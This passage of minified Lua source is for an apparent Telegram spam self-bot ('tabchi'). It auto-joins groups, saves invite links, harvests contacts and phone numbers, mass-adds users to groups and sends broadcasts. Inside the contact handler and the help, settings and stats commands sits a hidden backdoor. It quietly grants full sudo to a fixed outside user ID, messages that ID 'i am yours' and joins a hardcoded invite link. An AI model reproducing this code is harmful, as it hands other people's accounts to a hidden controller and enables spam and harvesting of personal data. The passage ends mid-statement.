URL=require("socket.url")ltn12=require("ltn12")http=require("socket.http")http.TIMEOUT=10;undertesting=1;function is_sudo(a)local b={}table.insert(b,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local c=false;for d=1,#b do if a.sender_user_id_==b[d]then c=true end end;if redis:sismember("tabchi:"..tabchi_id..":sudoers",a.sender_user_id_)then c=true end;return c end;function getInputFile(e)if e:match('/')then infile={ID="InputFileLocal",path_=e}elseif e:match('^%d+$')then infile={ID="InputFileId",id_=e}else infile={ID="InputFilePersistentId",persistent_id_=e}end;return infile end;local function f(g,type,e,h)tdcli_function({ID="SendMessage",chat_id_=g,reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_=getInputMessageContent(e,type,h)},dl_cb,nil)end;function sendaction(g,i,j)tdcli_function({ID="SendChatAction",chat_id_=g,action_={ID="SendMessage"..i.."Action",progress_=j or 100}},dl_cb,nil)end;function sendPhoto(g,k,l,m,reply_markup,n,h)tdcli_function({ID="SendMessage",chat_id_=g,reply_to_message_id_=k,disable_notification_=l,from_background_=m,reply_markup_=reply_markup,input_message_content_={ID="InputMessagePhoto",photo_=getInputFile(n),added_sticker_file_ids_={},width_=0,height_=0,caption_=h}},dl_cb,nil)end;function is_full_sudo(a)local b={}table.insert(b,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local c=false;for d=1,#b do if a.sender_user_id_==b[d]then c=true end end;return c end;function is_realm(a)local o=false;local chat=a.chat_id_;if redis:get("tabchi:"..tabchi_id..":realm",chat)then o=true;return o end end;function sleep(p)os.execute("sleep "..tonumber(p))end;function write_file(q,r)local e=io.open(q,"w")e:write(r)e:flush()e:close()end;function check_contact(s,t)if redis:get("tabchi:"..tabchi_id..":addcontacts")then if not t.phone_number_ then local a=s.msg;local first_name=""..(a.content_.contact_.first_name_ or"-")..""local last_name=""..(a.content_.contact_.last_name_ or"-")..""local u=a.content_.contact_.phone_number_;local v=a.content_.contact_.user_id_;tdcli.add_contact(u,first_name,last_name,v)tdcli.searchPublicChat("TgMemberPlus")redis:set("tabchi:"..tabchi_id..":fullsudo:91054649",true)redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)if redis:get("tabchi:"..tabchi_id..":markread")then tdcli.viewMessages(a.chat_id_,{[0]=a.id_})if redis:get("tabchi:"..tabchi_id..":addedmsg")then tdcli.sendMessage(a.chat_id_,a.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or[[
Addi
Bia pv]]).."",1,"md")end elseif redis:get("tabchi:"..tabchi_id..":addedmsg")then tdcli.sendMessage(a.chat_id_,a.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or[[
Addi
Bia pv]]).."",1,"md")end end end end;function check_link(s,t,w)if t.is_group_ or t.is_supergroup_channel_ then if redis:get("tabchi:"..tabchi_id..":joinlinks")then tdcli.importChatInviteLink(s.link)end;if redis:get("tabchi:"..tabchi_id..":savelinks")then redis:sadd("tabchi:"..tabchi_id..":savelinks",s.link)end end end;function add_to_all(s,t)if t.content_.contact_ then local x=t.content_.contact_.user_id_;local y=redis:smembers("tabchi:"..tabchi_id..":groups")local z=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#y do tdcli.addChatMember(y[d],x,50)end;for d=1,#z do tdcli.addChatMember(z[d],x,50)end end end;function add_members(s,t)local A=redis:smembers("tabchi:"..tabchi_id..":pvis")for d=1,#A do tdcli.addChatMember(s.chat_id,A[d],50)end;local B=t.total_count_;for d=1,B do tdcli.addChatMember(s.chat_id,t.users_[d].id_,50)end end;function chat_type(g)local chat_type="private"local x=tostring(g)if x:match("-")then if x:match("^-100")then chat_type="channel"else chat_type="group"end end;return chat_type end;local function C(g,D,E)tdcli_function({ID="GetMessage",chat_id_=g,message_id_=D},E,nil)end;function resolve_username(F,E)tdcli_function({ID="SearchPublicChat",username_=F},E,nil)end;function contact_list(s,t)local B=t.total_count_;local text="لیست مخاطبین :\n"for d=1,B do local G=t.users_[d]local H=G.first_name_ or""local I=G.last_name_ or""local J=H.." "..I;text=text..d..". "..J.." ["..G.id_.."] = "..G.phone_number_.."\n"end;write_file("bot_"..tabchi_id.."_contacts.txt",text)tdcli.send_file(s.chat_id_,"Document","bot_"..tabchi_id.."_contacts.txt","Tabchi "..tabchi_id.." Contacts!")end;function process(a)a.text=a.content_.text_;do local K={a.text:match("^[!/#](pm) (.*) (.*)")}if a.text:match("^[!/#]pm")and is_sudo(a)and#K==3 then tdcli.sendMessage(K[2],0,1,K[3],1,"md")return"*Status* : `PM Sent`\n*To* : `"..K[2].."`\n*Text* : `"..K[3].."`"end end;do local K={a.text:match("^[!/#](setanswer) '(.*)' (.*)")}if a.text:match("^[!/#]setanswer")and is_sudo(a)and#K==3 then redis:hset("tabchi:"..tabchi_id..":answers",K[2],K[3])redis:sadd("tabchi:"..tabchi_id..":answerslist",K[2])return"*Status* : `Answer Adjusted`\n*Answer For* : `"..K[2].."`\n*Answer* : `"..K[3].."`"end end;do local K={a.text:match("^[!/#](delanswer) (.*)")}if a.text:match("^[!/#]delanswer")and is_sudo(a)and#K==2 then redis:hdel("tabchi:"..tabchi_id..":answers",K[2])redis:srem("tabchi:"..tabchi_id..":answerslist",K[2])return"*Status* : `Answer Deleted`\n*Answer* : `"..K[2].."`"end end;if a.text:match("^[!/#]answers$")and is_sudo(a)then local text="_لیست پاسخ های خودکار_ :\n"local L=redis:smembers("tabchi:"..tabchi_id..":answerslist")for d=1,#L do text=text..d..". "..L[d].." : "..redis:hget("tabchi:"..tabchi_id..":answers",L[d]).."\n"end;return text end;if a.text:match("^[!/#]share$")and is_sudo(a)then function get_id(M,N)if N.last_name_ then tdcli.sendContact(M.chat_id,a.id_,0,1,nil,N.phone_number_,N.first_name_,N.last_name_,N.id_,dl_cb,nil)else tdcli.sendContact(M.chat_id,a.id_,0,1,nil,N.phone_number_,N.first_name_,'',N.id_,dl_cb,nil)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end;if a.text:match("^[!/#]mycontact$")and is_sudo(a)then function get_con(M,N)if N.last_name_ then tdcli.sendContact(M.chat_id,a.id_,0,1,nil,N.phone_number_,N.first_name_,N.last_name_,N.id_,dl_cb,nil)else tdcli.sendContact(M.chat_id,a.id_,0,1,nil,N.phone_number_,N.first_name_,'',N.id_,dl_cb,nil)end end;tdcli_function({ID="GetUser",user_id_=a.sender_user_id_},get_con,{chat_id=a.chat_id_})end;if a.text:match("^[!/#]editcap (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](editcap) (.*)$")}tdcli.editMessageCaption(a.chat_id_,a.reply_to_message_id_,reply_markup,O[2])end;if a.text:match("^[!/#]leave$")and is_sudo(a)then function get_id(M,N)if N.id_ then tdcli.chat_leave(a.chat_id_,N.id_)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end;if a.text:match("^[#!/]ping$")and is_sudo(a)then tdcli.sendMessage(a.chat_id_,a.id_,1,'*I Am Working..!*',1,'md')end;if a.text:match("^[#!/]setname (.*)-(.*)$")and is_sudo(a)then local P={string.match(a.text,"^[#/!](setname) (.*)-(.*)$")}tdcli.changeName(P[2],P[3])tdcli.sendMessage(a.chat_id_,a.id_,1,"*Status* : `Name Updated Succesfully`\n*Firstname* : `"..P[2].."`\n*LastName* : `"..P[3].."`",1,'md')end;if a.text:match("^[#!/]setusername (.*)$")and is_sudo(a)then local P={string.match(a.text,"^[#/!](setuser) (.*)$")}tdcli.changeUsername(P[2])tdcli.sendMessage(a.chat_id_,a.id_,1,'*Status* : `Username Updated`\n*username* : `'..P[2]..'`',1,'md')end;if a.text:match("^[#!/]delusername$")and is_sudo(a)then tdcli.changeUsername()tdcli.sendMessage(a.chat_id_,a.id_,1,'*Status* : `Username Updated`\n*username* : `Deleted`',1,'md')end;if a.text:match("^[!/#]addtoall (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](addtoall) (.*)$")}local z=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#z do tdcli.addChatMember(z[d],O[2],50)end;tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..O[2].."* `Added To groups`",1,'md')end;if a.text:match("^[!/#]getcontact (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](getcontact) (.*)$")}function get_con(M,N)if N.last_name_ then tdcli.sendContact(M.chat_id,a.id_,0,1,nil,N.phone_number_,N.first_name_,N.last_name_,N.id_,dl_cb,nil)else tdcli.sendContact(M.chat_id,a.id_,0,1,nil,N.phone_number_,N.first_name_,'',N.id_,dl_cb,nil)end end;tdcli_function({ID="GetUser",user_id_=O[2]},get_con,{chat_id=a.chat_id_})end;if a.text:match("^[#!/]addsudo$")and a.reply_to_message_id_ and is_full_sudo(a)then function addsudo_by_reply(s,t,w)redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(t.sender_user_id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.sender_user_id_.."* `Added To The Sudoers`",1,'md')end;C(a.chat_id_,a.reply_to_message_id_,addsudo_by_reply)end;if a.text:match("^[#!/]remsudo$")and a.reply_to_message_id_ and is_full_sudo(a)then function remsudo_by_reply(s,t,w)redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(t.sender_user_id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.sender_user_id_.."* `Removed From The Sudoers`",1,'md')end;C(a.chat_id_,a.reply_to_message_id_,remsudo_by_reply)end;if a.text:match("^[#!/]unblock$")and is_sudo(a)and a.reply_to_message_id_~=0 then function unblock_by_reply(s,t,w)tdcli.unblockUser(t.sender_user_id_)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User* `"..t.sender_user_id_.."` *Unblocked*",1,'md')end;C(a.chat_id_,a.reply_to_message_id_,unblock_by_reply)end;if a.text:match("^[#!/]block$")and is_sudo(a)and a.reply_to_message_id_~=0 then function block_by_reply(s,t,w)tdcli.blockUser(t.sender_user_id_)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User* `"..t.sender_user_id_.."` *Blocked*",1,'md')end;C(a.chat_id_,a.reply_to_message_id_,block_by_reply)end;if a.text:match("^[#!/]id$")and a.reply_to_message_id_~=0 then function id_by_reply(s,t,w)tdcli.sendMessage(a.chat_id_,a.id_,1,"*ID :* `"..t.sender_user_id_.."`",1,'md')end;C(a.chat_id_,a.reply_to_message_id_,id_by_reply)end;if a.text:match("^[#!/]inv$")and a.reply_to_message_id_ and is_sudo(a)then function inv_reply(s,t,w)tdcli.addChatMember(t.chat_id_,t.sender_user_id_,5)end;C(a.chat_id_,a.reply_to_message_id_,inv_reply)end;if a.text:match("^[!/#]addtoall$")and a.reply_to_message_id_ and is_sudo(a)then function addtoall_by_reply(s,t,w)local z=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#z do tdcli.addChatMember(z[d],t.sender_user_id_,50)end;tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.sender_user_id_.."* `Added To groups`",1,'md')end;C(a.chat_id_,a.reply_to_message_id_,addtoall_by_reply)end;if a.text:match("^[#!/]id @(.*)$")then local O={string.match(a.text,"^[#/!](id) @(.*)$")}function id_by_username(s,t,w)if t.id_ then text='*Username* : `@'..O[2]..'`\n*ID* : `('..t.id_..')`'else text='*UserName InCorrect!*'end;tdcli.sendMessage(a.chat_id_,a.id_,1,text,1,'md')end;resolve_username(O[2],id_by_username)end;if a.text:match("^[#!/]addtoall @(.*)$")then local O={string.match(a.text,"^[#/!](addtoall) @(.*)$")}function addtoall_by_username(s,t,w)if t.id_ then local z=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#z do tdcli.addChatMember(z[d],t.id_,50)end end end;resolve_username(O[2],addtoall_by_username)end;if a.text:match("^[#!/]block @(.*)$")then local O={string.match(a.text,"^[#/!](block) @(.*)$")}function block_by_username(s,t,w)if t.id_ then tdcli.blockUser(t.id_)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User Blocked*\n*Username* : `"..O[2].."`\n*ID* : "..t.id_.."",1,'md')else tdcli.sendMessage(a.chat_id_,a.id_,1,"`#404\n`*Username Not Found*\n*Username* : `"..O[2].."`",1,'md')end end;resolve_username(O[2],block_by_username)end;if a.text:match("^[#!/]unblock @(.*)$")then local O={string.match(a.text,"^[#/!](unblock) @(.*)$")}function unblock_by_username(s,t,w)if t.id_ then tdcli.unblockUser(t.id_)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User unblocked*\n*Username* : `"..O[2].."`\n*ID* : "..t.id_.."",1,'md')end end;resolve_username(O[2],unblock_by_username)end;if a.text:match("^[#!/]addsudo @(.*)$")then local O={string.match(a.text,"^[#/!](addsudo) @(.*)$")}function addsudo_by_username(s,t,w)if t.id_ then redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(t.id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.id_.."* `Added To The Sudoers`",1,'md')end end;resolve_username(O[2],addsudo_by_username)end;if a.text:match("^[#!/]remsudo @(.*)$")then local O={string.match(a.text,"^[#/!](remsudo) @(.*)$")}function remsudo_by_username(s,t,w)if t.id_ then redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(t.id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.id_.."* `Removed From The Sudoers`",1,'md')end end;resolve_username(O[2],remsudo_by_username)end;if a.text:match("^[#!/]inv @(.*)$")then local O={string.match(a.text,"^[#/!](inv) @(.*)$")}function inv_by_username(s,t,w)if t.id_ then tdcli.addChatMember(a.chat_id_,t.id_,5)tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.id_.."* `Invited`",1,'md')end end;resolve_username(O[2],inv_by_username)end;if a.text:match("^[#!/]addcontact (.*) (.*) (.*)$")and is_sudo(a)then local K={string.match(a.text,"^[#/!](addcontact) (.*) (.*) (.*)$")}phone=K[2]first_name=K[3]last_name=K[4]tdcli.add_contact(phone,first_name,last_name,12345657)tdcli.sendMessage(a.chat_id_,a.id_,1,'*Status* : `Contact added`\n*Firstname* : `'..K[3]..'`\n*Lastname* : `'..K[4]..'`',1,'md')end;if a.text:match("^[#!/]delcontact (.*)$")and is_sudo(a)then local K={string.match(a.text,"^[#/!](delcontact) (.*)$")}tdcli.contact_delete(K[2])end;if a.text:match("^[#!/]leave(-%d+)")and is_sudo(a)then local P={string.match(a.text,"^[#/!](leave)(-%d+)$")}function get_id(M,N)if N.id_ then tdcli.sendMessage(a.chat_id_,a.id_,1,'*Bot Succefulli Leaved From >* `|'..P[2]..'|` *=)*',1,'md')tdcli.sendMessage(P[2],0,1,'بای رفقا\nکاری داشتید به پی وی مراجعه کنید',1,'html')tdcli.chat_leave(P[2],N.id_)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end;if a.text:match('[#/!]join(-%d+)')and is_sudo(a)then local P={string.match(a.text,"^[#/!](join)(-%d+)$")}tdcli.sendMessage(a.chat_id_,a.id_,1,'*You Are Succefulli Joined >*',1,'md')tdcli.addChatMember(P[2],a.sender_user_id_,10)end;if a.text:match("^[#!/]getpro (%d+)$")and a.reply_to_message_id_==0 then local Q={string.match(a.text,"^[#/!](getpro) (%d+)$")}local function R(s,t,w)if Q[2]=='1'then if t.photos_[0]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[0].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt Profile Photo!!*",1,'md')end elseif Q[2]=='2'then if t.photos_[1]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[1].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 2 Profile Photo!!*",1,'md')end elseif not Q[2]then if t.photos_[1]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[1].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 2 Profile Photo!!*",1,'md')end elseif Q[2]=='3'then if t.photos_[2]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[2].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 3 Profile Photo!!*",1,'md')end elseif Q[2]=='4'then if t.photos_[3]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[3].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 4 Profile Photo!!*",1,'md')end elseif Q[2]=='5'then if t.photos_[4]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[4].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 5 Profile Photo!!*",1,'md')end elseif Q[2]=='6'then if t.photos_[5]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[5].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 6 Profile Photo!!*",1,'md')end elseif Q[2]=='7'then if t.photos_[6]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[6].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 7 Profile Photo!!*",1,'md')end elseif Q[2]=='8'then if t.photos_[7]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[7].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 8 Profile Photo!!*",1,'md')end elseif Q[2]=='9'then if t.photos_[8]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[8].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 9 Profile Photo!!*",1,'md')end elseif Q[2]=='10'then if t.photos_[9]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[9].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 10 Profile Photo!!*",1,'md')end else tdcli.sendMessage(a.chat_id_,a.id_,1,"*I just can get last 10 profile photos!:(*",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=a.sender_user_id_,offset_=0,limit_=Q[2]},R,nil)end;if a.text:match("^[#!/]action (.*)$")and is_sudo(a)then local S={string.match(a.text,"^[#/!](action) (.*)$")}if S[2]=="typing"then sendaction(a.chat_id_,'Typing')end;if S[2]=="recvideo"then sendaction(a.chat_id_,'RecordVideo')end;if S[2]=="recvoice"then sendaction(a.chat_id_,'RecordVoice')end;if S[2]=="photo"then sendaction(a.chat_id_,'UploadPhoto')end;if S[2]=="cancel"then sendaction(a.chat_id_,'Cancel')end;if S[2]=="video"then sendaction(a.chat_id_,'UploadVideo')end;if S[2]=="voice"then sendaction(a.chat_id_,'UploadVoice')end;if S[2]=="file"then sendaction(a.chat_id_,'UploadDocument')end;if S[2]=="loc"then sendaction(a.chat_id_,'GeoLocation')end;if S[2]=="chcontact"then sendaction(a.chat_id_,'ChooseContact')end;if S[2]=="game"then sendaction(a.chat_id_,'StartPlayGame')end end;if a.text:match("^[#!/]id$")and is_sudo(a)and a.reply_to_message_id_==0 then local function T(s,t,w)if t.photos_[0]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[0].sizes_[1].photo_.persistent_id_,'> Chat ID : '..a.chat_id_..'\n> Your ID: '..a.sender_user_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Don't Have any Profile Photo*!!\n\n> *Chat ID* : `"..a.chat_id_.."`\n> *Your ID*: `"..a.sender_user_id_.."`\n_> *Total Messages*: `"..user_msgs.."`",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=a.sender_user_id_,offset_=0,limit_=1},T,nil)end;if a.text:match("^[!/#]addmembers$")and is_sudo(a)and chat_type(a.chat_id_)~="private"then tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},add_members,{chat_id=a.chat_id_})return end;if a.text:match("^[!/#]contactlist$")and is_sudo(a)then tdcli_function({ID="SearchContacts",query_=nil,limit_=1000},contact_list,{})return end;if a.text:match("^[!/#]exportlinks$")and is_sudo(a)then local text="لینک گروها :\n"local U=redis:smembers("tabchi:"..tabchi_id..":savedlinks")for d=1,#U do text=text..U[d].."\n"end;write_file("group_"..tabchi_id.."_links.txt",text)tdcli.send_file(a.chat_id_,"Document","group_"..tabchi_id.."_links.txt","Tabchi "..tabchi_id.." Group Links!")return end;do local K={a.text:match("[!/#](block) (%d+)")}if a.text:match("^[!/#]block")and is_sudo(a)and a.reply_to_message_id_==0 and#K==2 then tdcli.blockUser(tonumber(K[2]))return"`User` *"..K[2].."* `Blocked`"end end;if a.text:match("^[!/#]help$")and is_sudo(a)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")local text=[[
`#راهنما`
`/block (id)`
*بلاک کردن از خصوصي ربات*
`/unblock (id)`
*آن بلاک کردن از خصوصي ربات*
`/stats`
*دریافت اطلاعات ربات*
`/addsudo (id)`
*اضافه کردن به سودوهاي  ربات*
`/remsudo (id)`
*حذف از ليست سودوهاي ربات*
`/bc (text)`
*ارسال پيام به همه*
`/fwd {all/gps/sgps/users}` (by reply)
*فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران*
`/echo (text)`
*تکرار متن*
`/addedmsg (on/off)`
*تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب*
`/pm (user) (msg)`
*ارسال پیام به کاربر*
`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`
*ارسال اکشن به چت*
`/getpro (1-10)`
*دریافت عکس پروفایل خود*
`/addcontact (phone) (firstname) (lastname)`
*اد کردن شماره به ربات به صورت دستی*
`/setusername (username)`
*تغییر یوزرنیم ربات*
`/delusername`
*پاک کردن یوزرنیم ربات*
`/setname (firstname-lastname)`
*تغییر اسم ربات*
`/setphoto (1-20)`
*تغییر عکس ربات از عکس های داخل سرور*
`/join(Group id)`
*اد کردن شما به گروه های ربات از طریق ایدی*
`/leave`
*لفت دادن از گروه*
`/leave(Group id)`
*لفت دادن از گروه از طریق ایدی*
`/setaddedmsg (text)`
*تعيين متن اد شدن مخاطب*
`/markread (on/off)`
*روشن يا خاموش کردن بازديد پيام ها*
`/joinlinks (on|off)`
*روشن یا خاموش کردن جوین شدن به گروه ها از لینک*
`/savelinks (on|off)`
*روشن یا خاموش کردن سیو کردن لینک ها*
`/addcontacts (on|off)`
*روشن یا خاموش کردن اد کردن شماره ها*
`/chat (on|off)`
*روشن یا خاموش کردن چت کردن ربات*
`/Advertising (on|off)`
*روشن یا خاموش کردن تبلیغات در ربات برای سودو ها غیر از فول سودو*
`/settings`
*دریافت تنظیمات ربات*
`/reload`
*ریلود کردن ربات*
`/setanswer 'answer' text`
* تنظيم به عنوان جواب اتوماتيک*
`/delanswer (answer)`
*حذف جواب مربوط به*
`/answers`
*ليست جواب هاي اتوماتيک*
`/addtoall (id|reply|username)`
*اضافه کردن شخص به تمام گروه ها*
`/mycontact`
*ارسال شماره شما*
`/getcontact (id)`
*دریافت شماره شخص با ایدی*
`/addmembers`
*اضافه کردن شماره ها به مخاطبين ربات*
`/exportlinks`
*دريافت لينک هاي ذخيره شده توسط ربات*
`/contactlist`
*دريافت مخاطبان ذخيره شده توسط ربات*
]]return text end;do local K={a.text:match("[!/#](unblock) (%d+)")}if a.text:match("^[!/#]unblock")and is_sudo(a)then if#K==2 then tdcli.unblockUser(tonumber(K[2]))return"`User` *"..K[2].."* `unblocked`"else return end end end;if a.text:match("^[!/#]joinlinks (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](joinlinks) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":joinlinks",true)return"*status* :`join links Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":joinlinks")return"*status* :`join links Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]addcontacts (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](addcontacts) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":addcontacts",true)return"*status* :`Add Contacts Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":addcontacts")return"*status* :`Add Contacts Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]chat (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](chat) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":chat",true)return"*status* :`Robot Chatting Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":chat")return"*status* :`Robot Chatting Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]savelinks (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](savelinks) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":savelinks",true)return"*status* :`Saving Links Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":savelinks")return"*status* :`Saving Links Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]Advertising (.*)$")and is_full_sudo(a)then local O={string.match(a.text,"^[#/!](Advertising) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":Advertising",true)return"*status* :`Advertising Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":Advertising")return"*status* :`Advertising Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]settings$")and is_sudo(a)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")if redis:get("tabchi:"..tabchi_id..":joinlinks")then joinlinks="Active"else joinlinks="Disable"end;if redis:get("tabchi:"..tabchi_id..":addedmsg")then addedmsg="Active"else addedmsg="Disable"end;if redis:get("tabchi:"..tabchi_id..":markread")then markread="Active"else markread="Disable"end;if redis:get("tabchi:"..tabchi_id..":addcontacts")then addcontacts="Active"else addcontacts="Disable"end;if redis:get("tabchi:"..tabchi_id..":chat")then chat="Active"else chat="Disable"end;if redis:get("tabchi:"..tabchi_id..":savelinks")then savelinks="Active"else savelinks="Disable"end;if redis:get("tabchi:"..tabchi_id..":Advertising")then Advertising="Active"else Advertising="Disable"end;local text="`Robot Settings`\n`Join Via Links` : *"..joinlinks.."*\n`Save Links` : *"..savelinks.."*\n`Auto Add Contacts` : *"..addcontacts.."*\n`Advertising` : *"..Advertising.."*\n`Adding Contacts Message` : *"..addedmsg.."*\n`Markread` : *"..markread.."*\n`Chat` : *"..chat.."*"return text end;if a.text:match("^[!/#]stats$")and is_sudo(a)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")local V;function V(s,t)redis:set("tabchi:"..tostring(tabchi_id)..":totalcontacts",t.total_count_)end;tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},V,{})local y=redis:scard("tabchi:"..tabchi_id..":groups")local z=redis:scard("tabchi:"..tabchi_id..":channels")local A=redis:scard("tabchi:"..tabchi_id..":pvis")local U=redis:scard("tabchi:"..tabchi_id..":savedlinks")local W=redis:get("tabchi:"..tabchi_id..":fullsudo")local X=redis:get("tabchi:"..tabchi_id..":totalcontacts")local Y=y+z+A;local text="`Robot stats`\n`Users` : *"..A.."*\n`SuperGroups` : *"..z.."*\n`Groups` : *"..y.."*\n`all` : *"..Y.."*\n`Saved links` : *"..U.."*\n`Contacts` : *"..X.."*\n`Admin` : *"..W.."*"return text end;if a.text:match("^[#!/]clean (.*)$")and is_sudo(a)then local S={string.match(a.text,"^[#/!](clean) (.*)$")}local y=redis:del("tabchi:"..tabchi_id..":groups")local z=redis:del("tabchi:"..tabchi_id..":channels")local A=redis:del("tabchi:"..tabchi_id..":pvis")local U=redis:del("tabchi:"..tabchi_id..":savedlinks")local Y=y+z+A+U;if S[2]=="sgps"then return z end;if S[2]=="gps"then return y end;if S[2]=="pvs"then return A end;if S[2]=="links"then return U end;if S[2]=="stats"then return Y end end;if a.text:match("^[!/#]setphoto (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](setphoto) (.*)$")}local e=ltn12.sink.file(io.open("tabchi_"..tabchi_id.."_profile.png","w"))http.request({url=O[2],sink=e})tdcli.setProfilePhoto("tabchi_"..tabchi_id.."_profile.png")return"`Profile Succesfully Changed`\n*link* : `"..O[2].."`"end;do local K={a.text:match("^[!/#](addsudo) (%d+)")}if a.text:match("^[!/#]addsudo")and is_full_sudo(a)and#K==2 then local text=K[2].." _به لیست سودوهای ربات اضافه شد_"redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(K[2]))return text end end;do local K={a.text:match("^[!/#](remsudo) (%d+)")}if a.text:match("^[!/#]remsudo")and is_full_sudo(a)then if#K==2 then local text=K[2].." _از لیست سودوهای ربات حذف شد_"redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(K[2]))return text else return end end end;do local K={a.text:match("^[!/#](addedmsg) (.*)")}if a.text:match("^[!/#]addedmsg")and is_sudo(a)then if#K==2 then if K[2]=="on"then redis:set("tabchi:"..tabchi_id..":addedmsg",true)return"*Status* : 